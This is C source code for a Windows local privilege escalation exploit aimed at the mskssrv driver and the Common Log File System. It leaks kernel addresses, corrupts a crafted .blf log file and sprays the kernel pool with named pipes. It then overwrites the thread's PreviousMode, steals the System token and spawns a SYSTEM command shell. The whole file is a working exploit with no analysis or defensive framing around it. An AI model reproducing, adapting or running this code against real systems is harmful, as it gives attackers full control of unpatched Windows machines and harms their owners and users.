#include "Types.h"
#include "crc32.h"
#pragma comment(lib, "ntdll.lib")

NtQuerySystemInformation_t NtQuerySystemInformation;
NtFsControlFile_t NtFsControlFile;
NtWriteVirtualMemory_t NtWriteVirtualMemory;
NtReadVirtualMemory_t NtReadVirtualMemory;
NtDeviceIoControlFile_t NtDeviceIoControlFile;
NtOpenProcess_t NtOpenProcess;
NtOpenThread_t NtOpenThread;
CreateLogFile_t CreateLogFile;
DeleteLogByHandle_t DeleteLogByHandle;
AddLogContainer_t AddLogContainer;

void* p_PoFxProcessorNotification;
void* p_IoSizeofWorkItem;
void* p_RtlClearBit;

HANDLE hDevice;
HANDLE hLogFile;

PHANDLE hPipeArray[sizeof(HANDLE) * SPRAY_SIZE];
PHANDLE hFileArray[sizeof(HANDLE) * SPRAY_SIZE];
PHANDLE hPipeArray2[sizeof(HANDLE) * SPRAY_SIZE];
PHANDLE hFileArray2[sizeof(HANDLE) * SPRAY_SIZE];

#define READ_VM(addr) NtReadVirtualMemory(hProc, (LPVOID)((ULONG_PTR)(addr)), readbuffer, sizeof(ULONG_PTR), &NumberOfBytesRead);
#define WRITE_VM(addr, value) NtWriteVirtualMemory(hProc, (LPVOID)((ULONG_PTR)(addr)), value, sizeof(ULONG_PTR), &NumberOfBytesRead);

LPCWSTR LogString = L"LOG:C:\\Users\\Public\\Log%x";
LPCWSTR ContainerString = L"C:\\Users\\Public\\Log%x1";
LPCSTR fopenFileA = "C:\\Users\\Public\\Log%x.blf";

ULONG_PTR FakeContainer = 0x1000000;
ULONG_PTR fakeVtable = 0x1000800;
ULONG_PTR fakeBitmapHeader = 0x1000400;
ULONG_PTR fakeScratch = 0x1000f00;

void randomize() {
	time_t t1;
	srand((unsigned)time(&t1));
	unsigned int r = rand();
	
	char* tmp = malloc(256);
	swprintf_s((wchar_t*)tmp, 127, LogString, r);
	LogString = tmp;

	wprintf(L"[+] %s\n", LogString);
	
	tmp = malloc(256);
	swprintf_s((wchar_t*)tmp, 127, ContainerString, r);
	ContainerString = tmp;
	
	wprintf(L"[+] %s\n", ContainerString);
	
	tmp = malloc(128);
	sprintf_s(tmp, 127, fopenFileA, r);
	fopenFileA = tmp;

	printf("[+] %s\n", fopenFileA);
}

void PublishTx()
{
	IO_STATUS_BLOCK ioStatus;
	ULONG bytesReturned = 0;

	MY_IRP inbuff = { 0 };

	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Type = 1;
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.values[0] = 0x0000000100000001;

	int ret = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_PublishRx, &inbuff, 0x100, NULL, bytesReturned);

	wprintf(L"[+] PublishRx returned with 0x%x\n", ret);
}

void FSInitializeContextRendezvous()
{
	IO_STATUS_BLOCK ioStatus;
	ULONG bytesReturned = 0;

	MY_IRP inbuff = { 0 };

	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Type = 1;
	inbuff.Flags = 0x000000136FE7474D;

	NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_IniContextRendezv, &inbuff, 0x100, NULL, bytesReturned);
}

PVOID* LeakBigPoolClfsAddresses() {
	NTSTATUS status;
	ULONG ulBytes = 0;
	PSYSTEM_BIGPOOL_INFORMATION bigPoolTableInfo = NULL;
	PVOID* clfsAddresses = NULL;
	ULONG ctr = 0;

	while((status = NtQuerySystemInformation(SystemBigPoolInformation, bigPoolTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH) {
		if (bigPoolTableInfo != NULL) {
			bigPoolTableInfo = (PSYSTEM_BIGPOOL_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bigPoolTableInfo, 2 * ulBytes);
		} else {
			bigPoolTableInfo = (PSYSTEM_BIGPOOL_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (status == 0) {
		clfsAddresses = (PVOID*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bigPoolTableInfo->Count * sizeof(PVOID));
		for (ULONG_PTR i = 0; i <bigPoolTableInfo->Count; i++) {
			PSYSTEM_BIGPOOL_ENTRY currentEntry = (PSYSTEM_BIGPOOL_ENTRY) &bigPoolTableInfo->AllocatedInfo[i];
			if (currentEntry->SizeInBytes == 0x7a00 && strncmp(currentEntry->Tag, "Clfs", 4) == 0){
				clfsAddresses[ctr++] = (PVOID)((ULONG64)currentEntry->VirtualAddress & 0xfffffffffffffffe);
			}
		}
	}

	HeapFree(GetProcessHeap(), 0, bigPoolTableInfo);
	return clfsAddresses;
}

PVOID LeakObjectAddress(DWORD pid, HANDLE Object)
{
	NTSTATUS status;
	ULONG ulBytes = 0;
	PSYSTEM_HANDLE_INFORMATION_EX handleTableInfo = NULL;
	PVOID objectAddress = NULL;
	
	// Allocate space in the heap for the handle table information which will be filled by the call to 'NtQuerySystemInformation' API
	while ((status = NtQuerySystemInformation(SystemExtendedHandleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (handleTableInfo != NULL)
		{
			handleTableInfo = (PSYSTEM_HANDLE_INFORMATION_EX)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
		}

		else
		{
			handleTableInfo = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (status == 0)
	{
		// iterate over the system's handle table and look for the handles beloging to our process
		for (ULONG_PTR i = 0; i < handleTableInfo->HandleCount; i++)
		{
			// if it finds our process and the handle matches the current token handle we already opened, print it
			if (handleTableInfo->Handles[i].UniqueProcessId == pid && handleTableInfo->Handles[i].HandleValue == Object)
			{
				objectAddress = handleTableInfo->Handles[i].Object;
				break;
			}
		}
	}
	else
	{
		if (handleTableInfo != NULL)
		{
			wprintf(L"[!] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
			HeapFree(GetProcessHeap(), 0, handleTableInfo);
		}
	}

	HeapFree(GetProcessHeap(), 0, handleTableInfo);
	return objectAddress;
}

BOOL PipeSpray(PVOID payload, DWORD size) {

	IO_STATUS_BLOCK isb;
	OVERLAPPED overlap;

	for (int i = 0; i < SPRAY_SIZE; i++) {
		hPipeArray[i] = CreateNamedPipeW(L"\\\\.\\pipe\\exploitpipe", PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, size, size, 0, 0);

		if (hPipeArray[i] == INVALID_HANDLE_VALUE) {
			wprintf(L"[!] Error while creating the named pipe: %d\n", GetLastError());
			return FALSE;
		}

		memset(&overlap, 0, sizeof(overlap));
		overlap.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
		if (!overlap.hEvent) {
			wprintf(L"[!] Error creating event: %d\n", GetLastError());
			return FALSE;
		}

		hFileArray[i] = CreateFileW(L"\\\\.\\pipe\\exploitpipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

		if (hFileArray[i] == INVALID_HANDLE_VALUE) {
			wprintf(L"[!] Error while opening the named pipe: %d\n", GetLastError());
			return FALSE;
		}

		NTSTATUS status = NtFsControlFile(hPipeArray[i], 0, 0, 0, &isb, FSCTL_CODE, payload, size, NULL, 0);

		if (status == STATUS_PENDING) {
			DWORD bytesTransferred;
			if (!GetOverlappedResult(hFileArray[i], &overlap, &bytesTransferred, TRUE)) {
				wprintf(L"[!] Overlapped operation failed: %d\n", GetLastError());
				return FALSE;
			}
		}
		else if (status != 0) {
			wprintf(L"[!] Error while calling NtFsControlFile: %p\n", status);
			return FALSE;
		}

		CloseHandle(overlap.hEvent);
	}

	return TRUE;
}

BOOL FillTheHoles(PVOID payload, DWORD size) {

	IO_STATUS_BLOCK isb;
	OVERLAPPED overlap;

	for (int i = 0; i < SPRAY_SIZE; i++) {
		hPipeArray2[i] = CreateNamedPipeW(L"\\\\.\\pipe\\exploitpipe", PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, size, size, 0, 0);

		if (hPipeArray2[i] == INVALID_HANDLE_VALUE) {
			wprintf(L"[!] Error while creating the named pipe: %d\n", GetLastError());
			return FALSE;
		}

		memset(&overlap, 0, sizeof(overlap));
		overlap.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
		if (!overlap.hEvent) {
			wprintf(L"[!] Error creating event: %d\n", GetLastError());
			return FALSE;
		}

		hFileArray2[i] = CreateFileW(L"\\\\.\\pipe\\exploitpipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

		if (hFileArray2[i] == INVALID_HANDLE_VALUE) {
			wprintf(L"[!] Error while opening the named pipe: %d\n", GetLastError());
			return FALSE;
		}

		NTSTATUS status = NtFsControlFile(hPipeArray2[i], 0, 0, 0, &isb, FSCTL_CODE, payload, size, NULL, 0);

		if (status == STATUS_PENDING) {
			DWORD bytesTransferred;
			if (!GetOverlappedResult(hFileArray2[i], &overlap, &bytesTransferred, TRUE)) {
				wprintf(L"[!] Overlapped operation failed: %d\n", GetLastError());
				return FALSE;
			}
		}
		else if (status != 0) {
			wprintf(L"[!] Error while calling NtFsControlFile: %p\n", status);
			return FALSE;
		}

		CloseHandle(overlap.hEvent);
	}

	return TRUE;
}

void CreateHoles() {
	for (int i = 0; i < SPRAY_SIZE; i += 4)
	{
		CloseHandle(hPipeArray[i]);
		CloseHandle(hFileArray[i]);
	}
}

ULONG64 GetKernelAddr () {
	ULONG len;
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	
	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len);

	if (pModuleInfo == NULL) {
		wprintf(L"Could not allocate memory for module info.\n");
		exit(1);
	}

	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

	if (status != (NTSTATUS)0x0) {
		wprintf(L"NtQuerySystemInformation failed with error code 0x%X\n", status);
		exit(1);
	}

	PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;
	PCHAR kernelImage = (PCHAR)pModuleInfo->Modules[0].Name;
	printf("[+] Mod name %s found at => %p\n", kernelImage, kernelImageBase);
	
	HeapFree(GetProcessHeap(), 0, pModuleInfo);
	return kernelImageBase;
}

BOOL CLFSResolver() {
	LPCSTR clfs = "clfsw32.dll";
	HANDLE hCLFS = LoadLibraryA(clfs);

	CreateLogFile = GetProcAddress(hCLFS, "CreateLogFile");

	if (!CreateLogFile) {
		wprintf(L"[!] Error while resolving CreateLogFile: %d\n", GetLastError());
		return FALSE;
	}

	DeleteLogByHandle = GetProcAddress(hCLFS, "DeleteLogByHandle");

	if (!DeleteLogByHandle) {
		wprintf(L"[!] Error while resolving DeleteLogByHandle: %d\n", GetLastError());
		return FALSE;
	}
	
	AddLogContainer = GetProcAddress(hCLFS, "AddLogContainer");

	if (!AddLogContainer) {
		wprintf(L"[!] Error while resolving AddLogContainer: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL NtosResolver() {
	LPCSTR ntoskrnl = "ntoskrnl.exe";
	HANDLE hNtos = LoadLibraryExA(ntoskrnl, 0, 1);
	PVOID* tmp = 0;
	ULONG64 aNtos = GetKernelAddr();

	tmp = (PVOID*)GetProcAddress(hNtos, "PoFxProcessorNotification");
	p_PoFxProcessorNotification = aNtos + ((tmp - (PVOID*)hNtos) << 3);

	if(!tmp) {
		wprintf(L"[!] Error while resolving PoFxProcessorNotification: %d\n", GetLastError());
		return FALSE;
	}

	// wprintf(L"\n%p\n\n", p_PoFxProcessorNotification);

	tmp = (PVOID*)GetProcAddress(hNtos, "IoSizeofWorkItem");
	p_IoSizeofWorkItem = aNtos + ((tmp - (PVOID*)hNtos) << 3);

	if(!tmp) {
		wprintf(L"[!] Error while resolving IoSizeofWorkItem: %d\n", GetLastError());
		return FALSE;
	}

	// wprintf(L"\n%p\n\n", p_IoSizeofWorkItem);

	tmp = (PVOID*) GetProcAddress(hNtos, "RtlClearBit");
	p_RtlClearBit = aNtos + ((tmp - (PVOID*)hNtos) << 3);

	if(!tmp) {
		wprintf(L"[!] Error while resolving RtlClearBit: %d\n", GetLastError());
		return FALSE;
	}

	// wprintf(L"\n%p\n\n", p_RtlClearBit);
	
	return TRUE;
}

BOOL NtResolver()
{
	LPCWSTR ntdll = L"ntdll.dll";

	NtDeviceIoControlFile = (NtDeviceIoControlFile_t)GetProcAddress(GetModuleHandleW(ntdll), "NtDeviceIoControlFile");

	if (!NtDeviceIoControlFile)
	{
		wprintf(L"[!] Error while resolving NtDeviceIoControlFile: %d\n", GetLastError());
		return FALSE;
	}

	NtOpenThread = (NtOpenThread_t)GetProcAddress(GetModuleHandleW(ntdll), "NtOpenThread");

	if (!NtOpenThread)
	{
		wprintf(L"[!] Error while resolving NtOpenThread: %d\n", GetLastError());
		return FALSE;
	}

	NtOpenProcess = (NtOpenProcess_t)GetProcAddress(GetModuleHandleW(ntdll), "NtOpenProcess");

	if (!NtOpenProcess)
	{
		wprintf(L"[!] Error while resolving NtOpenProcess: %d\n", GetLastError());
		return FALSE;
	}

	NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleW(ntdll), "NtQuerySystemInformation");

	if (!NtQuerySystemInformation)
	{
		wprintf(L"[!] Error while resolving NtQuerySystemInformation: %d\n", GetLastError());
		return FALSE;
	}

	NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(GetModuleHandleW(ntdll), "NtWriteVirtualMemory");

	if (!NtWriteVirtualMemory)
	{
		wprintf(L"[!] Error while resolving NtWriteVirtualMemory: %d\n", GetLastError());
		return FALSE;
	}

	NtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddress(GetModuleHandleW(ntdll), "NtReadVirtualMemory");

	if (!NtReadVirtualMemory)
	{
		wprintf(L"[!] Error while resolving NtReadVirtualMemory: %d\n", GetLastError());
		return FALSE;
	}

	NtFsControlFile = (NtFsControlFile_t)GetProcAddress(GetModuleHandleW(ntdll), "NtFsControlFile");

	if (!NtFsControlFile)
	{
		wprintf(L"[!] Error while resolving NtFsControlFile: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int crcCalculatorAndFix(char* mybuf, int mysize) {

	uint32_t table[256];
	crc32_generate_table(table);

	char* ptr = (char*)mybuf;
	uint16_t slen = mysize;

	uint32_t CRC = 0;
	for (int cnt = 0; cnt < slen; cnt++) {
		CRC = crc32_update(table, CRC, ptr, 1);
		ptr++;
	}

	return CRC;
}

void modifyBlfFile() {
	UCHAR* data = (UCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x10000); 
	FILE* file = fopen(fopenFileA, "r+");
	fread(data, 0x100, 0x100, file);
	// modify blf data

	char* struct1 = data + 0x800 + 0x70 + 0x1400;
	char* struct2 = data + 0x800 + 0x70 + 0x1400 + 0x7a00;

	*(DWORD*)(struct1 - 0xc) = 0x1400;
	*(ULONG64*)(struct1) = 0x30C1FDF008;
	*(ULONG64*)(struct1 + 0x8) = 0x80000;
	*(ULONG64*)(struct1 + 0x10) = 0x0;
	*(ULONG64*)(struct1 + 0x18) = FakeContainer;
	*(ULONG64*)(struct1 + 0x20) = 0x200000001;


	*(DWORD*)(struct2 - 0xc) = 0x1400;
	*(ULONG64*)(struct2) = 0x30C1FDF008;
	*(ULONG64*)(struct2 + 0x8) = 0x80000;
	*(ULONG64*)(struct2 + 0x10) = 0x0;
	*(ULONG64*)(struct2 + 0x18) = FakeContainer;
	*(ULONG64*)(struct2 + 0x20) = 0x200000001;

	wprintf(L"[+] Before: %8lx %8lx %8lx %8lx\n", *(DWORD*)(data + 0x800), *(DWORD*)(data + 0x800 + 4), *(DWORD*)(data + 0x800 + 8), *(DWORD*)(data + 0x800 + 0xc));
	memset(data + 0x800 + 0xc, 0, 4);
	memset(data + 0x800 + 0xc + 0x7a00, 0, 4);
	
	wprintf(L"[+] Clear : %8lx %8lx %8lx %8lx\n", *(DWORD*)(data + 0x800), *(DWORD*)(data + 0x800 + 4), *(DWORD*)(data + 0x800 + 8), *(DWORD*)(data + 0x800 + 0xc));
	ULONG CRC0 = crcCalculatorAndFix(data + 0x800, 0x7a00);
	ULONG CRCS = crcCalculatorAndFix(data + 0x800 + 0x7a00, 0x7a00);

	memcpy(data + 0x800 + 0xc, &CRC0, 4);
	memcpy(data + 0x800 + 0xc + 0x7a00, &CRCS, 4);
	wprintf(L"[+] After : %8lx %8lx %8lx %8lx\n", *(DWORD*)(data + 0x800), *(DWORD*)(data + 0x800 + 4), *(DWORD*)(data + 0x800 + 8), *(DWORD*)(data + 0x800 + 0xc));

	fseek(file, 0, SEEK_SET);

	fwrite(data, 0x100, 0x100, file);
	HeapFree(GetProcessHeap(), 0, data);
	fclose(file);
}

void spin() {
	getchar();
}

int main()
{
	PVOID OUR_EPROCESS, EPROCESS_SYS, ETHREAD, FILE_OBJECT, LOG_FILE; LOG_FILE = OUR_EPROCESS = EPROCESS_SYS = ETHREAD = FILE_OBJECT = NULL;
	ULONG64 PreviousMode;
	ULONG_PTR OurtokenAddress, SystokenAddress, fscontext2;
	HRESULT hr;
	HANDLE hProc;
	PULONG64* CLFSKernelAddrArray1, CLFSKernelAddrArray2; CLFSKernelAddrArray1 = CLFSKernelAddrArray2 = NULL;

	hDevice = CreateFileA("\\\\?\\root#system#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96e080c7-143c-11d1-b40f-00a0c9223196}&{3c0d501a-140b-11d1-b40f-00a0c9223196}", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);

	if (!hDevice)
	{
		return 1;
	}

	if (!NtResolver())
	{
		return 1;
	}

	if (!CLFSResolver()) {
		return 1;
	}

	if(!NtosResolver()){
		return 1;
	}

	wprintf(L"[+] Successfully opened mskssrv device handle => %p\n", hDevice);
	
	randomize();

	hLogFile = CreateLogFile( LogString, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ| FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0);
	
	if(hLogFile == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Unable to open log file 1st %d\n", GetLastError());
		return 1;
	}

	LONGLONG pcbContainer = 512;
	
	if(!AddLogContainer(hLogFile, (PULONGLONG)&pcbContainer, ContainerString, NULL)) {
		wprintf(L"[-] AddLogContainer failed! Error => %d", GetLastError());
		return 1;
	}

	CloseHandle(hLogFile);
	modifyBlfFile();


	CLFSKernelAddrArray1 = LeakBigPoolClfsAddresses();
	
	hLogFile = CreateLogFile(LogString, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ| FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0);
	
	if(hLogFile == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Unable to open log file 2nd %d\n", GetLastError());
		return 1;
	}

	wprintf(L"[+] Successfully opened clfs log file with handle => %p\n", hLogFile);

	CLFSKernelAddrArray2 = LeakBigPoolClfsAddresses();

	for (ULONG_PTR i = 0; CLFSKernelAddrArray2[i]; i++) {
		BOOL flag = TRUE;
		for (ULONG_PTR j = 0; CLFSKernelAddrArray1[j]; j++){
			if (CLFSKernelAddrArray2[i] == CLFSKernelAddrArray1[j]) {
				flag = FALSE;
				break;
			}
		}
		if (flag) {
			LOG_FILE = CLFSKernelAddrArray2[i];
			break;
		}
	}

	if(!LOG_FILE){
		wprintf(L"[-] Could not find Log file kernel Address!\n");
		return 1;
	}


	// wprintf(L"\n\nGET LAST ERR => %p\n\n", GetLastError());

	
	CLIENT_ID clientId = { (HANDLE)GetCurrentProcessId(), NULL };
	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	NTSTATUS status = NtOpenProcess(&hProc, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);

	if (status != 0)
	{
		wprintf(L"[!] Error NtOpenProcess failed: %ld\n", status);
		return 1;
	}

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread)
	{
		wprintf(L"[!] Error while getting the thread ID: %ld\n", status);
		return 1;
	}

	OUR_EPROCESS = LeakObjectAddress(GetCurrentProcessId(), hProc);
	EPROCESS_SYS = LeakObjectAddress(4, (HANDLE)4);
	FILE_OBJECT = LeakObjectAddress(GetCurrentProcessId(), hDevice);
	ETHREAD = LeakObjectAddress(GetCurrentProcessId(), hThread);

	if (!OUR_EPROCESS && !EPROCESS_SYS && !FILE_OBJECT && !ETHREAD && !LOG_FILE)
	{
		wprintf(L"[!] Error when attempted to leak kernel addresses\n");
		return 1;
	}

	OurtokenAddress = (ULONG_PTR)OUR_EPROCESS + OFFSET_OF_EX_FAST_REF;
	SystokenAddress = (ULONG_PTR)EPROCESS_SYS + OFFSET_OF_EX_FAST_REF;
	PreviousMode = (ULONG64)ETHREAD + OFFSET_OF_PREVIOUS_MODE;
	fscontext2 = (ULONG_PTR)FILE_OBJECT + OFFSET_OF_FSCONTEXT2;
	wprintf(L"[+] Our process EPROCESS => %p\n", OUR_EPROCESS);
	wprintf(L"[+] Our process _EX_FAST_REF Token address => %p\n", OurtokenAddress);
	wprintf(L"[+] System process EPROCESS => %p\n", EPROCESS_SYS);
	wprintf(L"[+] System process _EX_FAST_REF Token address => %p\n", SystokenAddress);
	wprintf(L"[+] Device handle => %p\n", FILE_OBJECT);
	wprintf(L"[+] Main ETHREAD => %p\n", ETHREAD);
	wprintf(L"[+] PreviousMode => %p\n", PreviousMode);
	wprintf(L"[+] CLFS log file kernel address => %p\n", LOG_FILE);

	// ULONG64 prevmode = PreviousMode + 0x30; // Add 0x30 because of ObfDereferenceObject+0x1f

	LPVOID buffer = VirtualAlloc(FakeContainer, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (buffer != FakeContainer)
	{
		wprintf(L"[!] Error while allocating memory for the fake container buffer: %d\n", GetLastError());
		return 1;
	}

	ZeroMemory(buffer, 4096);

	*(ULONG64*)fakeVtable = p_PoFxProcessorNotification;
	*(ULONG64*)(fakeVtable + 0x8) = p_IoSizeofWorkItem;

	*(ULONG64*)FakeContainer = fakeVtable;
	*(ULONG64*)(FakeContainer + 0x48) = fakeBitmapHeader;
	*(ULONG64*)(FakeContainer + 0x40) = fakeScratch;

	*(ULONG64*)(fakeBitmapHeader) = 0x40;
	*(ULONG64*)(fakeBitmapHeader + 0x8) = PreviousMode;

	*(ULONG64*)(fakeScratch + 0x68) = p_RtlClearBit;

	PVOID payload = malloc(128);

	memset(payload, 0, 128);

	ULONG64 logFileOff = (ULONG64)LOG_FILE + 0x2c9;
	memcpy((PVOID*)((ULONG_PTR)payload + 88), &logFileOff, sizeof(ULONG_PTR)); // passed as an argument to UnmapPages

	// Spray the pool with named pipes
	wprintf(L"[+] Spraying the pool with objects of size 0x80\n");
	if (!PipeSpray(payload, 128)) {
		wprintf(L"[!] PipeSpray failed.\n");
		return 1; // Exit or handle the error accordingly
	}

	// Create holes
	wprintf(L"[+] Closing some pipes to create holes in the pool spray\n");
	CreateHoles();
	wprintf(L"[+] Made some holes!\n");

	// Allocate context registration object
	wprintf(L"[+] Allocating context registration object\n");
	FSInitializeContextRendezvous();

	// Fill the holes in the pool with our payload
	wprintf(L"[+] Spraying the pool with objects of size 0x80\n");
	if (!FillTheHoles(payload, 128)) {
		wprintf(L"[!] PipeSpray failed.\n");
		return 1; // Exit or handle the error accordingly
	}

	// Start separate thread for PublishTx call
	wprintf(L"[+] Executing PublishTx\n");
	// CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PublishTx, NULL, 0, NULL);
	PublishTx();
	// wprintf(L"[+] =================================> PublishRx Disabled <=======================================\n");

	wprintf(L"[+] Trying CreateLogFile\n");
	CreateLogFile(LogString, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ| FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0);


	wprintf(L"[+] Overwrite Previous Mode Completed\n");

	LPVOID readbuffer = malloc(sizeof(ULONG_PTR));
	ULONG NumberOfBytesRead = 0;
	memset(readbuffer, 0, sizeof(ULONG_PTR));

	wprintf(L"[+] Trying to overwrite our token with system token\n");
	READ_VM(SystokenAddress)
	WRITE_VM(OurtokenAddress, readbuffer)
	wprintf(L"[+] Overwrite was successful!\n");
	wprintf(L"[+] System Token => 0x%p\n", readbuffer);

	wprintf(L"[+] Restoring offset in clfs log...\n");
	ULONG_PTR offset = 0x1458;
	WRITE_VM((ULONG*)LOG_FILE + 0x398, &offset);

	wprintf(L"[+] Restoring PreviousMode...\n");
	READ_VM(PreviousMode)
	ULONG_PTR restore_prevmode = *(PULONG_PTR)readbuffer ^ 1;
	WRITE_VM(PreviousMode, &restore_prevmode)

	wprintf(L"[+] PreviousMode set to 1 successfully!\n");

	Sleep(500);

	system("start cmd.exe");

	Sleep(1000);

	for (int i = 0; i < SPRAY_SIZE; i++)
	{
		CloseHandle(hPipeArray[i]);
		CloseHandle(hFileArray[i]);

		CloseHandle(hPipeArray2[i]);
		CloseHandle(hFileArray2[i]);
	}

	CloseHandle(hDevice);
	CloseHandle(hProc);
	CloseHandle(hThread);
	DeleteLogByHandle(hLogFile);
	CloseHandle(hLogFile);
	
	return 0;
}
